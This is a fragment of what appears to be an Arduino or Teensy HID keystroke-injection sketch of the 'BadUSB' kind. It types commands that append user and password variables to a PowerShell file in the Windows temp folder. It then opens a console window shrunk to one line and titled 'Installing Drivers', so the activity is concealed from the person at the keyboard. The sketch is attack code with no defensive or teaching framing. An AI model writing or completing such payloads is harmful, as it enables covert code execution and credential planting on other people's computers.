...
void setup(){
  ...
  Keyboard.println("echo $user = \"xxxxxxx\" >> %temp%\\in.ps1");
  Keyboard.println("echo $pass = \"xxxxxxx\" >> %temp%\\in.ps1");
...
Keyboard.send_now();
delay(100);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=16 LINES=1 && title Installing Drivers\"");
delay(100);
